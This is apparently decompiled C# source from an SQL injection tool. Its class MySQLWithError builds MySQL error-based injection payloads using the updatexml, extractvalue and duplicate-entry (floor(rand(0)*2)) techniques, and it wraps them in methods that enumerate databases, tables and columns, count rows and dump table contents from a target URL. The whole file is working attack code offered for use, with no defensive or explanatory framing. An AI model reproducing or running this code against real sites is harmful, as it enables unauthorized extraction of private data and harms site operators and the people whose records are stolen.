using System.Collections.Generic;

namespace DataBase;

public class MySQLWithError
{
	private static string string_0;

	private static string string_1;

	private static string string_2;

	private static string smethod_0(string string_3, MySQLErrorType mySQLErrorType_0)
	{
		string result = "";
		switch (mySQLErrorType_0)
		{
		case MySQLErrorType.UpdateXML:
			result = string_3.Replace("[t]", "updatexml(rand(),(select [t]),0)");
			break;
		case MySQLErrorType.DuplicateEntry:
			result = string_3.Replace("[t]", "(select 1 from(select count(*),concat((select (select [t]) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)");
			break;
		case MySQLErrorType.ExtractValue:
			result = string_3.Replace("[t]", "extractvalue(rand(),(select [t]))");
			break;
		}
		return result;
	}

	public static string Info(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, List<string> lColumn, string sEndUrl = "")
	{
		string sTraject2 = smethod_0(sTraject, oType);
		return MySQLNoError.Info(sTraject2, oCollaction, bHexEncoded: false, lColumn, sEndUrl);
	}

	public static string DataBases(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, bool bCorrentDB, string sWhere = "", string sOrderBy = "", string sEndUrl = "", int limitX = 0, int limitY = 1)
	{
		string sTraject2 = smethod_0(sTraject, oType);
		return MySQLNoError.DataBases(sTraject2, oCollaction, bHexEncoded: false, bCorrentDB, sWhere, sOrderBy, sEndUrl, limitX, limitY);
	}

	public static string Tables(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, string sDataBase, string sWhere = "", string sOrderBy = "", string sEndUrl = "", int limitX = 0, int limitY = 1)
	{
		string sTraject2 = smethod_0(sTraject, oType);
		return MySQLNoError.Tables(sTraject2, oCollaction, sDataBase, sWhere, sOrderBy, sEndUrl, limitX, limitY);
	}

	public static string Columns(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, string sDataBase, string sTable, bool bDataType, string sWhere = "", string sOrderBy = "", string sEndUrl = "", int limitX = 0, int limitY = 1)
	{
		string sTraject2 = smethod_0(sTraject, oType);
		return MySQLNoError.Columns(sTraject2, oCollaction, sDataBase, sTable, bDataType, sWhere, sOrderBy, sEndUrl, limitX, limitY);
	}

	public static string Dump(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, bool bIFNULL, string sDataBase, string sTable, List<string> lColumn, int limitX, int limitY = 1, string sEndUrl = "", string sWhere = "", string sOrderBy = "", string sCustomQuery = "")
	{
		string sTraject2 = smethod_0(sTraject, oType);
		return MySQLNoError.Dump(sTraject2, oCollaction, bHexEncoded: false, bIFNULL, sDataBase, sTable, lColumn, limitX, limitY, sWhere, sOrderBy, sEndUrl, sCustomQuery);
	}

	public static string DumpNoKey(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, bool bIFNULL, string sDataBase, string sTable, List<string> lColumn, int limitX, int limitY = 1, string sEndUrl = "", string sWhere = "", string sOrderBy = "", string sCustomQuery = "")
	{
		string sTraject2 = smethod_0(sTraject, oType);
		return MySQLNoError.DumpNoKey(sTraject2, oCollaction, bHexEncoded: false, bIFNULL, sDataBase, sTable, lColumn, limitX, limitY, sWhere, sOrderBy, sEndUrl, sCustomQuery);
	}

	public static string Count(string sTraject, MySQLCollactions oCollaction, MySQLErrorType oType, Schema o, string sDataBase, string sTable, string sWhere = "", string sEndUrl = "")
	{
		string sTraject2 = smethod_0(sTraject, oType);
		return MySQLNoError.Count(sTraject2, oCollaction, o, sDataBase, sTable, sWhere, sEndUrl);
	}
}
